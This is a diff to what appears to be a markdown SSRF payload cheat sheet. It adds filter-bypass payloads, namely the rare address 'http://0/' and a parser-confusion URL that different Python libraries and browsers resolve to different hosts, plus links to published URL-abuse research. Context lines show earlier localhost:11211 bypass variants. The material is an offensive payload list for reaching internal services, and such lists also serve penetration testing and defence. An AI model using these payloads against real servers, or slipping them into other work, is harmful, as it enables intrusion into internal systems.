@@ -28,7 +28,7 @@ Advanced exploit using type=url
 ```
 Change "type=file" to "type=url"
 Paste URL in text field and hit enter
-Using this vulnerability users can upload images from any image URL = trigger an SSRF 
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
 ```
 
 ## Bypassing
@@ -58,5 +58,20 @@ localhost:+11211aaa
 localhost:00011211aaaa
 ```
 
+Bypass using rare address
+```
+http://0/
+```
+
+Bypass using tricks combination
+```
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+```
+
 ## Thanks to
 * [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+* [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
+* [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
